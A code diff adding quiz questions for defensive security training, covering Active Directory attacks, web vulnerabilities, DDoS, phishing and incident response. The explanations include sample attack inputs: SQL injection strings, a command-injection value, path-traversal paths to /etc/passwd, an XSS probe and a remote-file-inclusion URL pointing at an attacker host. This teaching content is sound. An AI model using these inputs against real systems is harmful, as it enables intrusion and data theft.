+    {q:'What does TSIG add to DNS zone transfers?',a:['A shared-secret signature, so a spoofed IP isn\u2019t enough to get the zone','Encryption of all DNS queries','Faster transfers','A list of blocked domains'],why:'Restrict AXFR by IP, and authenticate it with TSIG because IPs can be spoofed.'},
+    {q:'What do SPAN and TAP copy?',a:['Network traffic (full packets) to a monitoring tool','Windows event logs','Firewall rule lists','Only layer 2 MAC tables'],why:'Both send a copy of traffic to an IDS or sensor. SPAN is port mirroring on the switch and can drop packets under load. A TAP sits on the cable and copies everything.',tag:'Precision'},
+    {q:'A web server in the DMZ is hacked. What should stop the attacker reaching the LAN?',a:['Firewall rules that deny DMZ \u2192 LAN traffic','NAT','DHCP snooping','The web server\u2019s antivirus'],why:'The DMZ is the lobby. Internet \u2192 DMZ is allowed on specific ports, DMZ \u2192 LAN is denied, LAN \u2192 DMZ is allowed.'},
+    {q:'Why is the Domain Controller the top target?',a:['It handles every domain login and stores every account\u2019s password hash','All internet traffic passes through it','It runs the company website','It hosts the firewall'],why:'Authentication traffic goes through the DC, not all traffic. It holds NTDS.dit with every hash, including krbtgt. Own the DC and you own the domain.',tag:'Precision'},
+    {q:'A regular user was added to Domain Admins at 3 AM. Which account matters most to investigate?',a:['The account that made the change (the subject in Event 4728)','Only the user who was added','The DC computer account','The firewall admin'],why:'A regular user can\u2019t add themselves. Whoever made the change has admin rights and is likely compromised too. Contain both.',tag:'Contain the right thing'},
+    {q:'Rogue Domain Admin addition. What is the first containment step?',a:['Remove it from Domain Admins and disable the account, then escalate immediately','Block the source IP and monitor','Wait for the user to explain in the morning','Reboot the domain controller'],why:'Pull the privilege first. A Domain Admin compromise is a major incident, so escalate early, not at the end.',tag:'IP blocking is a side step'},
+  ];
+  var QS3=[
+    {q:'What is a Domain Controller?',a:['The server running AD that handles every domain login and stores all password hashes','The router between the LAN and the internet','The server that hosts the company website','A firewall for Windows machines'],why:'It handles authentication traffic (not all traffic) and stores NTDS.dit. Own the DC and you own the domain.'},
+    {q:'What is a GPO?',a:['Settings pushed to many machines at once, like password rules or USB blocking','A group of admin users','A type of Kerberos ticket','A folder for organizing AD objects'],why:'Group Policy Objects push configuration across the domain. OUs are the folders they get applied to.'},
+    {q:'Kerberos runs on which port?',a:['88','389','445','3389'],why:'88 Kerberos, 389 LDAP (636 LDAPS), 445 SMB, 3389 RDP, 53 DNS.'},
+    {q:'What is LDAP used for?',a:['Querying the AD directory (users, groups, SPNs)','Issuing Kerberos tickets','Sharing files','Remote desktop'],why:'Any domain user can read most of AD over LDAP by default, which attackers use for recon before Kerberoasting or BloodHound mapping.'},
+    {q:'Event ID 4728/4732 fires. What happened?',a:['A member was added to a security group','A Kerberos TGT was requested','A login failed','A service was created'],why:'Watch for additions to Domain Admins. Check the subject account that made the change: it\u2019s likely compromised too.'},
+    {q:'In Kerberos, what is the TGT used for?',a:['To request service tickets from the KDC','To log directly into a file server','To encrypt the user\u2019s password','To reset passwords'],why:'The TGT is shown only to the KDC. Service tickets are shown to the services.'},
+    {q:'Each TGT is encrypted with which account\u2019s hash?',a:['krbtgt','The user\u2019s','The service account\u2019s','The local administrator\u2019s'],why:'krbtgt\u2019s hash is the KDC\u2019s master key. Steal it and you can forge any TGT: a Golden Ticket.'},
+    {q:'Event ID 4768 vs 4769?',a:['4768 = TGT requested, 4769 = service ticket requested','4768 = failed login, 4769 = successful login','4768 = group change, 4769 = password reset','4768 = service ticket, 4769 = TGT'],why:'4768 is step 1 (AS), 4769 is step 2 (TGS). A spike of 4769s from one user hints at Kerberoasting.'},
+    {q:'Why does Kerberos break when clocks are far apart?',a:['Pre-auth uses an encrypted timestamp; more than ~5 minutes of skew fails','Tickets are stored by date','LDAP needs time sync','NTLM takes over automatically'],why:'The timestamp prevents replay attacks, so time sync matters.'},
+    {q:'What does an attacker need for Kerberoasting?',a:['Any domain user account','Domain Admin rights','No account at all','Physical access to the DC'],why:'Any domain user can request service tickets. AS-REP Roasting is the one that needs no account, only usernames.'},
+    {q:'What makes an account Kerberoastable?',a:['It has an SPN','It has pre-authentication disabled','It is a member of Domain Admins','It logged in recently'],why:'Its service ticket is encrypted with its password hash, so it can be cracked offline.'},
+    {q:'47 \u00d7 4769 in 2 minutes from one marketing user, all encryption type 0x17. What is it?',a:['Kerberoasting','Golden Ticket','DNS tunneling','Normal Outlook traffic'],why:'0x17 = RC4, which cracks much faster than AES. Many requests from one user in a short window is the classic sign.'},
+    {q:'Kerberoasting detected. What\u2019s the most urgent step besides disabling the user and isolating their PC?',a:['Reset the targeted service accounts\u2019 passwords, privileged ones first','Migrate everything to gMSA first','Disable RC4 domain-wide first','Block the user\u2019s IP'],why:'The attacker already has the tickets. A fast reset makes any cracked password useless. gMSA and AES are the long-term fix.',tag:'Contain first, harden later'},
+    {q:'Best long-term defense against Kerberoasting?',a:['gMSA (long random rotated passwords) + AES only','Account lockout policy','Blocking port 88','More antivirus'],why:'Cracking is offline, so lockouts don\u2019t help. Long random passwords make cracking impractical.'},
+    {q:'What does AS-REP Roasting target?',a:['Accounts with Kerberos pre-authentication disabled','Accounts with an SPN','The krbtgt account','DNS servers'],why:'Anyone can request their AS-REP without proving the password, then crack it offline. Event 4768 with pre-auth type 0.'},
+    {q:'Why can\u2019t lockout policies stop roasting attacks?',a:['The cracking happens offline, so there are no failed logins','Kerberos ignores lockouts','Attackers use the krbtgt account','Lockouts only apply to RDP'],why:'The DC only sees a normal-looking ticket request.'},
+    {q:'Golden vs Silver Ticket: which hash does a Silver Ticket need?',a:['A service account\u2019s hash','krbtgt\u2019s hash','The user\u2019s hash','The DC\u2019s computer hash'],why:'Silver = one service, never touches the DC (no 4768/4769). Golden = krbtgt, whole domain.'},
+    {q:'How do you invalidate Golden Tickets?',a:['Reset the krbtgt password twice','Reset every user\u2019s password','Reboot the DC','Disable Kerberos'],why:'AD remembers the previous krbtgt password, so one reset isn\u2019t enough.'},
+    {q:'LSASS vs NTDS.dit?',a:['LSASS: process on every Windows machine with logged-in users\u2019 creds in memory. NTDS.dit: database on the DC with every domain hash','Both are files on the DC','LSASS is on the DC only, NTDS on workstations','They are the same thing'],why:'LSASS = the receptionist with badges of whoever is in the building now. NTDS.dit = HR\u2019s master filing cabinet.'},
+    {q:'What does LSA Protection (RunAsPPL) do?',a:['Runs LSASS as a protected process so even admin processes can\u2019t read its memory','Encrypts NTDS.dit','Disables NTLM','Rotates local admin passwords'],why:'Blocks standard Mimikatz dumps, but a malicious signed driver can bypass it. Credential Guard is the strongest layer.'},
+    {q:'Why is a registry change to WDigest UseLogonCredential=1 suspicious?',a:['It makes LSASS store plaintext passwords again','It disables Kerberos','It turns off logging','It enables RDP'],why:'Attackers switch it back on and wait for users to log in, then dump plaintext passwords.'},
+    {q:'Why doesn\u2019t Pass-the-Hash need cracking?',a:['NTLM only checks that you know the hash, so the hash works like the password','Kerberos accepts hashes','The hash is already plaintext','It uses the krbtgt account'],why:'Defend with LAPS, Credential Guard, Protected Users, and a tiered admin model.'},
+    {q:'Logon type 3 vs 10?',a:['3 = network (SMB, PtH), 10 = RDP','3 = RDP, 10 = network','3 = keyboard, 10 = service','3 = unlock, 10 = batch'],why:'2 = at the keyboard, 3 = over the network, 10 = remote interactive (RDP), 9 = new credentials (Mimikatz pth).'},
+    {q:'What does LAPS do?',a:['Gives every machine a unique random local admin password','Locks accounts after failed logins','Encrypts Kerberos tickets','Scans for phishing'],why:'One stolen local admin hash no longer opens every machine.'},
+    {q:'it_admin: 4624 type 3 NTLM on 15 workstations in 10 minutes from one marketing PC. What do you contain first?',a:['Disable/reset it_admin and isolate the marketing PC (and the 15 hosts)','Reinstall all 16 PCs immediately','Block the marketing PC\u2019s IP and keep monitoring','Switch the domain from NTLM to Kerberos'],why:'The attacker holds one hash: it_admin\u2019s. As long as it works, they keep moving. Isolate with EDR (don\u2019t power off), keeping evidence.',tag:'Contain the right thing'},
+    {q:'Why did that admin\u2019s hash end up on a marketing PC in the first place?',a:['The admin logged into it, leaving creds in LSASS. The fix is a tiered admin model','NTDS.dit replicates to workstations','Kerberos copies hashes to all PCs','DHCP shares them'],why:'Privileged accounts should never log into regular workstations.'},
+    {q:'Remote service creation, like PsExec, shows up as which Event ID?',a:['7045','4625','4768','4728'],why:'Lateral movement signs: one account on many hosts, workstation-to-workstation SMB/RDP, 7045 new services.'},
+  ];
+  var QSWEB=[
+    {q:"Main difference between a WAF and a regular firewall?",a:["WAF inspects the HTTP request at L7; a firewall sees IPs/ports at L3/L4","WAF works at L3, firewall at L7","WAF only blocks DDoS","A firewall decrypts TLS, a WAF doesn't"],why:"Firewall decides WHO can talk to the server; WAF decides WHAT they can say to the app."},
+    {q:"Why must a WAF terminate TLS?",a:["It can't inspect encrypted HTTPS payloads otherwise","To speed up the site","To issue certificates","To block port 443"],why:"No decryption means no inspection. The WAF usually acts as a reverse proxy that terminates TLS."},
+    {q:"What is a reverse proxy?",a:["Sits in front of servers and receives requests on their behalf, hiding the origin","Sits in front of users and hides their IP when browsing","A backup DNS server","A VPN for admins"],why:"Forward proxy hides the client; reverse proxy hides the server. Cloudflare, Nginx, F5."},
+    {q:"Behind a reverse proxy, web server logs show the same source IP for every request. Where do you find the real client IP?",a:["The X-Forwarded-For header or the proxy/WAF logs","The User-Agent header","The DNS server logs","The TTL field"],why:"Without XFF, every attack looks like it came from Cloudflare."},
+    {q:"SQLi appears in web server logs but NOT in the Cloudflare WAF logs. Most likely cause?",a:["Attacker found the origin IP and bypasses the WAF; allow only WAF IP ranges at the origin","Cloudflare is down","The WAF is in detection mode","The attack is DOM-based XSS"],why:"Origin IP leaks via DNS history, unproxied subdomains, email headers. Bonus fix: Cloudflare Tunnel / authenticated origin pulls.",tag:"Read the clue"},
+    {q:"Negative vs positive security model?",a:["Negative = block known-bad signatures; positive = allow only known-good","Negative = allow all; positive = block all","Negative = IPS; positive = WAF","They are the same"],why:"OWASP CRS is a negative model. Positive is stronger but hard to maintain. Anomaly scoring reduces false positives."},
+    {q:"What is virtual patching?",a:["A temporary WAF rule blocking exploitation of a known vuln until the real patch is applied","Patching a VM","Auto-updating the app","Replacing the WAF signatures"],why:"Example: Log4Shell, block ${jndi: patterns. It buys time; the real patch is still required."},
+    {q:"Which attack will a WAF almost never catch?",a:["IDOR: /invoice/1001 to 1002","Reflected XSS with <script>","UNION-based SQLi","Path traversal with ../"],why:"The request is perfectly valid; only the app's authorization logic knows it's wrong. Same for business logic flaws."},
+    {q:"WAF alert: SQLi on /login. What's the KEY question?",a:["Did a successful login/session follow from that source, and as which account?","Which country is the IP from?","Is the WAF up to date?","How many requests per second?"],why:"SQLi on login = auth bypass attempt (admin' --). Analyze the payload first, then blocked vs passed, then sessions. Blocking the IP is a side step.",tag:"Contain the right thing"},
+    {q:"Requests to /product?id= take exactly 5 seconds, no errors, no output. What's happening?",a:["Time-based blind SQLi","Reflected XSS","DDoS","CSRF"],why:"' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5),0)-- extracts data one yes/no question at a time."},
+    {q:"Root-cause fix for SQL injection?",a:["Parameterized queries (prepared statements)","A WAF","Blocking quotes in input","Encrypting the database"],why:"Query structure and data are sent separately, so input is always a value, never SQL code."},
+    {q:"Out-of-band SQLi exfiltrates data mostly via...",a:["DNS lookups from the DB server to an attacker domain","The HTTP response body","Error messages","Response delays"],why:"Same trick as DNS tunneling (data in subdomains), but triggered by injection. Detect: DB servers making external DNS queries."},
+    {q:"Which XSS type does the WAF and server never see?",a:["DOM-based: payload after # is never sent to the server","Stored","Reflected","Blind"],why:"Page JS reads a source (location.hash) and writes it into a sink (innerHTML, eval, document.write)."},
+    {q:"Why is stored XSS the most dangerous?",a:["It's persistent and hits every visitor, no crafted link needed","It's the easiest to detect","It only runs on the server","It bypasses HTTPS"],why:"Scale and persistence. Reflected needs the victim to click a crafted link."},
+    {q:"Root-cause fix for XSS?",a:["Context-aware output encoding","Parameterized queries","Anti-CSRF tokens","Rate limiting"],why:"< becomes &lt; so the browser displays it as text. Plus CSP and HttpOnly cookies."},
+    {q:"XSS vs CSRF?",a:["XSS runs attacker code in the victim's browser on the site; CSRF makes the browser send an unwanted request with its cookies","They are the same","CSRF runs code on the server","XSS needs the victim to be logged out"],why:"CSRF fix: anti-CSRF tokens, SameSite cookies, re-auth for sensitive actions."},
+    {q:"An AWS app has a 'preview link' feature. What attack worries you most?",a:["SSRF to 169.254.169.254, leaking IAM credentials","Reflected XSS","CSRF","Brute force"],why:"Clue: the SERVER fetches a user-supplied URL. Capital One 2019. Fix: URL allowlist, block metadata IPs, IMDSv2.",tag:"Read the clue"},
+    {q:"Input '8.8.8.8; whoami' in a ping tool returns a username. Attack?",a:["Command injection","SQL injection","Path traversal","SSRF"],why:"Shell separators: ; && | ` $(). Gold detection signal: the web process spawning cmd/powershell/bash."},
+    {q:"EDR: w3wp.exe spawned cmd.exe running whoami. First step?",a:["Isolate the server via EDR (keep it powered on) and investigate the process tree","Disable the app pool user and keep the server online","Block the attacker IP","Add an upload allowlist"],why:"The server itself is compromised, so host isolation IS right here. Likely: web shell, command injection, or SQLi via xp_cmdshell. Hardening comes later.",tag:"Contain first, harden later"},
+    {q:"?file=../../../../etc/passwd is an example of...",a:["Path traversal","RFI","SSRF","IDOR"],why:"Encoded bypasses: %2e%2e%2f, ..%252f. RFI = ?page=http://evil.com/shell.php leading to code execution."},
+    {q:"Best defense against a web shell via file upload?",a:["Allowlist extensions, check magic bytes, rename, store outside web root with no execute","Only check the Content-Type header","Limit file size","Use HTTPS"],why:"Bypasses: shell.php.jpg, shell.pHp, fake Content-Type. Detect new scripts in /uploads and ?cmd= requests."},
+    {q:"IDOR belongs to which OWASP Top 10 category?",a:["Broken access control (#1)","Injection","Cryptographic failures","Security misconfiguration"],why:"Fix: server-side authorization check on every object request. Detect: one session enumerating sequential IDs."},
+  ];
+  var QSAD=[
+    {q:"What does BloodHound actually show you?",a:["Attack paths through AD relationships (sessions, group memberships, ACLs) to targets like Domain Admins","A list of open ports on domain controllers","Malware running on endpoints","Weak passwords in the domain"],why:"Graph theory: nodes are users/computers/groups, edges are relationships. Defenders use it too, to cut paths."},
+    {q:"SharpHound collects most of its data using which protocol?",a:["LDAP (389/636), plus SMB/RPC for sessions and local admins","Kerberos only","DNS zone transfers","SNMP"],why:"Any authenticated domain user can query LDAP, which is why AD recon is so cheap for attackers."},
+    {q:"A normal workstation suddenly sends a huge burst of LDAP queries enumerating every user, group and computer. Most likely?",a:["AD enumeration, e.g. SharpHound/BloodHound collection","A normal Windows update","DNS tunneling","A DDoS on the DC"],why:"Detect: LDAP query spikes from non-admin hosts, Event ID 1644, honeytoken accounts.",tag:"Name it"},
+    {q:"That workstation is doing recon against AD. What do you contain first?",a:["The single source host and the account it's running as","Every domain controller","All 300 hosts it queried","The whole user VLAN"],why:"Recon reads data; the targets aren't compromised. Contain the source, not the things it looked at.",tag:"Contain the right thing"},
+    {q:"Which tool is defender-focused and gives an AD security score with findings?",a:["PingCastle","Impacket","Mimikatz","Responder"],why:"PingCastle and ADRecon audit AD health. Impacket is an attacker/pentest toolkit (secretsdump, psexec)."},
+    {q:"Kerberoasting works by...",a:["Requesting service tickets for SPN accounts and cracking them offline","Brute forcing the DC over RDP","Replaying NTLM hashes","Poisoning DNS"],why:"Offline cracking leaves no failed logons. Detect: 4769 with RC4 encryption. Fix: long service account passwords, gMSA."},
+  ];
+  var QSCD=[
+    {q:"Base64 is an example of...",a:["Encoding: reversible by anyone, no key, no security","Encryption","Hashing","Salting"],why:"Encoding = format. Encryption = confidentiality with a key. Hashing = one-way integrity."},
+    {q:"Which one is one-way and used for integrity or storing passwords?",a:["Hashing","Encoding","Symmetric encryption","Base64"],why:"Same input, same hash. You compare hashes, you don't reverse them."},
+    {q:"Why add a salt to password hashes?",a:["Identical passwords get different hashes, defeating rainbow tables","It encrypts the hash","It makes hashing reversible","It shortens the hash"],why:"Salt is random and stored with the hash. Not secret, just unique."},
+    {q:"Cache poisoning vs DNS spoofing: key difference?",a:["Poisoning corrupts a resolver's cache, hitting every user of it until TTL expires","Spoofing affects more users","Poisoning only works on hosts files","They're identical"],why:"Spoofing usually targets one victim on-path (e.g. after ARP spoofing). Poisoning has a far bigger blast radius."},
+    {q:"Source port randomization mainly defends against...",a:["DNS cache poisoning (Kaminsky-style)","DNS amplification","DGA malware","Zone transfers"],why:"TXID x source port = ~4 billion guesses. A mitigation; DNSSEC is the real fix."},
+    {q:"A host queries hundreds of random-looking domains like xk2q9a.com, most returning NXDOMAIN. Most likely?",a:["DGA malware searching for its C2","A misconfigured printer","DNS amplification","Normal browsing"],why:"Conficker used DGA. Defenders can predict domains and sinkhole them (WannaCry kill switch).",tag:"Name it"},
+    {q:"Attacker takes over the registrar account and changes the domain's records. This is...",a:["Registrar-level DNS hijacking, affects the whole world","Host-level hijacking","Cache poisoning","DNS tunneling"],why:"Sea Turtle campaign. Fix: MFA + registrar lock."},
+  ];
+  var QSDD=[
+    {q:"Bandwidth normal, but thousands of connections each send a header line every ~15s and never finish. Name it.",a:["Slowloris (L7 / application layer)","SYN flood","UDP flood","DNS amplification"],why:"Fix: header timeouts, cap connections per IP, reverse proxy/CDN that buffers full requests.",tag:"Name it"},
+    {q:"Half-open TCP connections fill the server's table. Attack and fix?",a:["SYN flood; SYN cookies","Slowloris; longer timeouts","Smurf; disable ICMP","HTTP flood; WAF"],why:"Protocol/state exhaustion. Stateful firewalls and load balancers have connection tables too."},
+    {q:"400 Gbps UDP flood, 10 Gbps link. Manager wants to block the top 50 IPs. Best response?",a:["Escalate to ISP/scrubbing provider: the pipe is full before traffic reaches the firewall","Block the 50 IPs","Restart the firewall","Block all UDP on the server"],why:"Volumetric = upstream problem. On-prem rules can't help a saturated link.",tag:"Not 'block the IP'"},
+    {q:"What is upstream scrubbing?",a:["Routing traffic through a high-capacity provider that drops attack traffic and forwards clean traffic","Cleaning malware off endpoints","Deleting old firewall rules","Rate limiting on your own server"],why:"Diverted via DNS (reverse proxy) or BGP. Weakness: if the origin IP leaks, attackers skip it."},
+    {q:"1,200 failed logons from one IP, each a different username, same password. Name it.",a:["Password spraying","Credential stuffing","Dictionary attack","Offline cracking"],why:"Few attempts per user = evades lockout.",tag:"Name it"},
+    {q:"Spraying run ends with 3 successful logons, one is svc_backup. First priority?",a:["Contain the compromised accounts, svc_backup first: reset (coordinated), revoke sessions, review activity","Enable MFA company-wide","Block the source IP and close the ticket","Change the lockout policy"],why:"A 4624 after many 4625s = compromise. Service accounts are often privileged and skip MFA.",tag:"Contain first, harden later"},
+    {q:"Leaked user:pass pairs tried ~once each from 8,000 IPs. Name it, and are the IPs spoofed?",a:["Credential stuffing; IPs are real (TCP needs a handshake): botnet/residential proxies","Password spraying; IPs are spoofed","Credential stuffing; IPs are spoofed","DDoS; IPs are spoofed"],why:"Spoofing only works for connectionless traffic (UDP). A login over TCP means a real source IP.",tag:"Read the clue"},
+    {q:"Mid-DDoS, EDR alerts: Outlook spawned PowerShell on a finance PC, connecting out. What do you do?",a:["Escalate now, isolate the workstation, find the phishing email and other recipients","Queue it until the DDoS is over","Block the PowerShell outbound IP only","Reimage the web server"],why:"DDoS as smokescreen. The quiet alert is the real intrusion.",tag:"Contain the right thing"},
+  ];
+  var QSFW=[
+    {q:"Internet-exposed ports on one server: 443, 3389, 6379. Which are a problem?",a:["3389 (RDP) and 6379 (Redis); 443 is expected for a web server","All three","Only 443","Only 6379"],why:"RDP: VPN + MFA. Redis: close it, often no auth. Then check logs, since exposure may already mean compromise.",tag:"Read the clue"},
+    {q:"Port 445 is...",a:["SMB: EternalBlue/WannaCry, lateral movement, relay attacks","RDP","LDAPS","WinRM"],why:"Normal internally, never on the internet."},
+    {q:"Rule 1: allow LAN to any. Rule 2: deny LAN to Internet 445. What's the problem?",a:["Rule 2 is shadowed (first match wins), and Rule 1 means no egress filtering","Rule 2 blocks too much","Nothing, the implicit deny handles it","Rule 1 should be reject"],why:"Put specific rules above broad ones, and replace any/any with only what's needed (80/443, DNS to internal resolver)."},
+    {q:"Inbound is tight, but a workstation has sent data nightly to an unknown IP on TCP 8443 for two weeks. FIRST step?",a:["Isolate the workstation via EDR","Kill the process","Rewrite the egress policy","Reset the user's password"],why:"Isolate, block the destination, scope other hosts, investigate, then fix egress. Killing the process first can destroy evidence.",tag:"Contain the right thing"},
+    {q:"Blocking unsolicited internet traffic at the edge: drop or reject?",a:["Drop: no reply, scanners wait for timeouts and learn less","Reject: faster for the attacker","Either, no difference","Allow and log"],why:"Reject (RST/ICMP unreachable) is better internally so legit apps fail fast."},
+    {q:"Internal users blocked from a VLAN, and you want apps to fail fast for troubleshooting. Drop or reject?",a:["Reject","Drop","Allow","Rate limit"],why:"Check your reasoning matches your choice. Drop is defensible for very sensitive VLANs only if you say why.",tag:"Read the clue"},
+    {q:"Best replacement for 'any to SRV-FIN01 3389 ALLOW'?",a:["JumpHost to SRV-FIN01 3389, admin group only, logging on, MFA at the jump host","VPN users to SRV-FIN01 any port","any to SRV-FIN01 3389 DENY, then allow any","Internet to SRV-FIN01 3389 with a strong password"],why:"'any' includes every internal host, so it's a lateral movement risk, not just brute force."},
+    {q:"Stateful vs stateless firewall?",a:["Stateful tracks connections, so replies to allowed traffic are allowed automatically","Stateless tracks connections","Stateful only works on UDP","No difference"],why:"Stateless needs rules in both directions. Stateful connection tables can be filled by SYN floods."},
+  ];
+  var QSSOC=[
+    {q:"4625 events: 200 different accounts, 1-2 failures each, all from one IP within 10 minutes. What's this?",a:["Password spraying","Brute force on a single account","Kerberoasting","Pass-the-Hash"],why:"Spraying = few common passwords across many accounts, staying under lockout thresholds. Brute force = many tries against one account.",tag:"Name the attack"},
+    {q:"Event 4624 with Logon Type 10 means:",a:["RemoteInteractive (RDP)","Network logon (SMB share)","Interactive (keyboard at the machine)","Service logon"],why:"Type 2 interactive, 3 network, 5 service, 10 RDP. Type 3 from a workstation to many servers is a lateral movement clue."},
+    {q:"Which Windows Event ID tells you the Security log was cleared?",a:["1102","4688","4720","4672"],why:"1102 = audit log cleared (anti-forensics, escalate). 4688 process created, 4720 user created, 4672 special privileges assigned."},
+    {q:"Sysmon Event ID 1 gives you:",a:["Process creation with full command line, parent process and hashes","Network connections","DNS queries","File deletion"],why:"Sysmon 1 = process create, 3 = network connection, 22 = DNS query. The parent-child chain is gold for detection."},
+    {q:"Which one is an IOA rather than an IOC?",a:["winword.exe spawning powershell.exe with an encoded command","A known-bad file hash","A C2 IP address from a threat feed","A malicious domain name"],why:"IOC = evidence something already happened (static artifacts). IOA = behavior showing an attack in progress, regardless of tools used."},
+    {q:"Top of the Pyramid of Pain (hardest for the attacker to change):",a:["TTPs","Hash values","IP addresses","Domain names"],why:"Hashes change with one byte, IPs and domains are cheap. Detecting behavior (TTPs) forces attackers to change how they operate."},
+    {q:"Main difference between EDR and SIEM?",a:["EDR lives on the endpoint and can act (isolate, kill); SIEM collects and correlates logs from many sources","SIEM can isolate hosts; EDR only stores logs","They are the same thing","EDR is only for servers"],why:"SIEM = visibility and correlation across the environment. EDR = deep endpoint telemetry plus response actions."},
+    {q:"XDR vs MDR?",a:["XDR is technology correlating across endpoint, network, email and cloud; MDR is a managed service with people doing detection and response","MDR is a newer version of XDR","XDR is a service, MDR is a tool","Both mean endpoint antivirus"],why:"MDR = outsourced analysts (like Experis' managed SOC model). XDR = extended telemetry and correlation."},
+    {q:"You have a suspicious internal document. Why check its hash on VirusTotal instead of uploading it?",a:["Uploaded files become available to VT's paying users, which could leak sensitive data","Hash lookups are more accurate","Uploads take too long","VirusTotal can't scan documents"],why:"Search the hash first. 'Not found' doesn't mean clean: it may be new or targeted."},
+    {q:"SIEM alert: 'Admin login outside business hours' fires nightly from the backup server's service account. Best approach?",a:["Verify it's the scheduled backup job, then tune the rule with a documented exception","Delete the rule","Disable the service account","Ignore it permanently without notes"],why:"Validate before tuning. Exceptions should be narrow (that account, that host, that time window) and documented."}
+  ];
+  var QSPH=[
+    {q:"What does SPF check?",a:["Whether the sending server's IP is authorized to send for the envelope sender's domain","That the message wasn't altered in transit","What to do with mail that fails checks","The reputation of links in the body"],why:"SPF = authorized senders list in DNS. It checks the envelope (Return-Path), not the visible From."},
+    {q:"What does DKIM provide?",a:["A cryptographic signature proving the message came from the domain and wasn't modified","A list of allowed sending IPs","Encryption of the email body","Spam scoring"],why:"The receiver checks the signature against a public key in the sender's DNS."},
+    {q:"What does DMARC add on top of SPF and DKIM?",a:["Alignment with the visible From domain, a policy (none/quarantine/reject) and reporting","A second signature","Attachment scanning","Encryption between mail servers"],why:"Without DMARC, an attacker can pass SPF with their own domain while spoofing your From address."},
+    {q:"From: ceo@company.com, Reply-To: ceo.company@gmail.com, 'Urgent wire transfer, keep it confidential'. What is this?",a:["Business Email Compromise (CEO fraud)","Spear phishing with malware","Spam","Typosquatting"],why:"Red flags: mismatched Reply-To, urgency, secrecy, money. Verify by calling the CEO on a known number.",tag:"Name the attack"},
+    {q:"A user clicked a phishing link and entered their password on a fake login page. FIRST action?",a:["Reset the password and revoke active sessions/tokens","Block the sender's domain","Delete the email from their inbox","Reimage their laptop"],why:"The credentials are the compromised asset, not the email or the laptop. Then check sign-in logs for attacker logins and MFA changes.",tag:"Contain the right thing"},
+    {q:"One user reported a phishing email. Next step to scope it?",a:["Search mail logs for all recipients of that sender/subject/URL and purge it","Reply to the attacker","Only warn the reporting user","Wait for more reports"],why:"Phishing is rarely sent to one person. Also check who clicked (proxy/DNS logs for the URL)."},
+    {q:"Safest way to analyze a suspicious link?",a:["Use a sandbox or URL scanner (urlscan.io, any.run) instead of opening it","Open it in incognito mode","Open it on your phone","Click it from your work PC to see what happens"],why:"Incognito doesn't protect you from exploits or credential pages. Defang URLs in tickets (hxxp, [.])."},
+    {q:"Sender domain is 'rnicrosoft.com'. What technique?",a:["Typosquatting / lookalike domain","DNS tunneling","Domain fronting","Subdomain takeover"],why:"'rn' looks like 'm'. Homoglyphs (Cyrillic letters) are a related trick. SPF/DKIM may pass because the attacker owns that domain!",tag:"Read the clue"},
+    {q:"Biggest red flag in an attachment?",a:["invoice.pdf.exe or a macro-enabled .docm","A normal PDF from a known vendor","A .txt file","A .png image"],why:"Double extensions hide executables. Macro documents asking to 'Enable content' are a classic initial access vector."},
+    {q:"In email headers, how do you trace the real path of the message?",a:["Read the Received headers from bottom to top","Read the From field","Read the Subject","Read the first Received header only"],why:"Each server adds a Received line on top, so the bottom one is closest to the origin. The From field is trivially spoofed."}
+  ];
+  var QSIR=[
+    {q:"NIST incident response phases, in order:",a:["Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity","Detection → Preparation → Recovery → Containment","Containment → Detection → Eradication → Preparation","Identification → Lessons learned → Containment → Recovery"],why:"SANS uses 6 steps (PICERL), same idea: Prepare, Identify, Contain, Eradicate, Recover, Lessons learned."},
+    {q:"Ransomware is encrypting a file share. EDR shows it's coming from one workstation. FIRST step?",a:["Isolate the workstation via EDR","Shut down the file server","Restore the share from backup","Block the attacker's IP"],why:"Stop the source. Restoring before containment means it gets encrypted again. Then scope for other infected hosts.",tag:"Contain the right thing"},
+    {q:"Why not just power off a compromised machine?",a:["You lose volatile evidence in memory (processes, network connections, keys)","It might damage the disk","The user will complain","Powering off spreads malware"],why:"Network isolation contains it while keeping memory for forensics."},
+    {q:"Malware creates a scheduled task so it survives reboot. Which Kill Chain stage?",a:["Installation","Delivery","Reconnaissance","Actions on Objectives"],why:"Recon → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives."},
+    {q:"A host beacons every 60 seconds (with small jitter) to a rarely seen domain. Which Kill Chain stage?",a:["Command & Control","Exploitation","Weaponization","Delivery"],why:"Regular intervals, small consistent packet sizes and rare domains are classic beaconing signs."},
+    {q:"In MITRE ATT&CK, tactic vs technique?",a:["Tactic = the attacker's goal (why); technique = how they achieve it","Tactic = a specific tool; technique = a malware family","They mean the same thing","Technique = the goal; tactic = the how"],why:"Example: tactic Credential Access, technique OS Credential Dumping (T1003)."},
+    {q:"Mimikatz dumping LSASS memory maps to which ATT&CK tactic?",a:["Credential Access","Initial Access","Exfiltration","Reconnaissance"],why:"Technique T1003.001 (LSASS Memory). Usually followed by Lateral Movement with the stolen credentials."},
+    {q:"Tier 1: a Domain Admin account logs in successfully at 3am from an unusual country. Best action?",a:["Escalate immediately to Tier 2/IR with your evidence, following the playbook","Close it as a false positive","Keep monitoring for a few days","Email the admin and wait for a reply"],why:"High privilege + anomaly = high severity. Escalating fast with evidence (time, IP, geo, what happened after) is a strength, not a weakness."},
+    {q:"Removing the persistence mechanism and patching the exploited vulnerability belongs to:",a:["Eradication","Containment","Preparation","Detection"],why:"Containment stops the spread; eradication removes the cause; recovery returns systems to normal with monitoring.",tag:"Harden last"},
+    {q:"When do 'lessons learned' happen?",a:["Post-Incident Activity, after recovery","During containment","Before detection","Only if the incident was severe"],why:"Output: improved detections, playbooks and controls. It feeds back into Preparation."}
+  ];
+  var QSLOG=[
+    {q:"Web log: GET /search?q=<script>alert(1)<\/script> → 200. What is it?",a:["Reflected XSS attempt","SQL injection","Path traversal","Command injection"],why:"200 doesn't mean it worked, only that the server responded. Check if the payload was reflected unencoded in the response.",tag:"Name the attack"},
+    {q:"Web log: GET /item?id=1' OR '1'='1' -- → 200. What is it?",a:["SQL injection","XSS","CSRF","Directory brute forcing"],why:"Classic tautology to make the WHERE clause always true. Look for unusually large responses from the same IP."},
+    {q:"Web log: GET /download?file=../../../../etc/passwd → 400. What is it?",a:["Path traversal (directory traversal)","SQL injection","SSRF","XSS"],why:"../ climbs directories. 400 suggests it was blocked, but check for other encoded variants (%2e%2e%2f) that returned 200."},
